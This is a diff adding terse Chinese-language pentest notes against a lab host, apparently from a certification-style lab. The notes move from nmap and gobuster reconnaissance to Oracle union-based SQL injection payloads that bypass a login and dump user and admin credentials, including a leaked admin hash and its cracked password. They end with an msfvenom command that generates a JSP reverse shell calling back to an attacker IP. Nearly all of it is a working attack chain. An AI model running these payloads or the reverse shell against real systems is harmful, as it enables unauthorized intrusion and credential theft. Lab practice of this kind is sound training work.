@@ -1,0 +1,38 @@
+nmap -sV -sC -Pn 10.11.1.222 > nmap.txt
+gobuster dir -u http://10.11.1.222:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php > gobuster.txt
+
+1.nmap掃描發現8080端口,使用gobuster查找發現blog登入頁面
+2.嘗試SQL Inejection 查找部份 返回156可成功bypass登入
+3. 使用' order by 1--  發現到3正常,4以後異常,確認欄位有3欄
+4.使用SQL Injection取得帳號密碼
+5.破解出admin密碼是adminadmin
+6.使用admin登入後,可以上傳檔案
+7.生成shell.jsp並上傳檔案,然後訪問頁面執行
+
+
+根據文章嘗試  http://www.securityidiots.com/Web-Pentest/SQL-Injection/Union-based-Oracle-Injection.html
+
+' union select 1,2,3--   ###不行
+' union select 1,2,3-- from dual--     ###不行
+' union select null,null,null from dual--  ###成功
+
+
+
+' union select '1111',null,null from dual--
+' union select null,'2222',null from dual--
+
+
+' or '1' ='1' union select null,null,null from dual--
+
+' OR'1'='1' UNION ALL SELECT user,null,null FROM dual--
+取得用戶明及密碼
+' OR'1'='1' union select USER_NAME||USER_ID||PASSWORD,null,null from WEB_USERS--
+
+
+取的admin帳密
+' OR'1'='1' union select ADMIN_NAME||ADMIN_ID||PASSWORD,null,null from WEB_ADMINS--
+admin  1   d82494f05d6917ba02f7aaa29689ccb444bb73f20380876cb05d1f37537b7892
+破解出密碼是adminadmin
+
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST="192.168.119.134" LPORT=4444 -f raw > shell.jsp
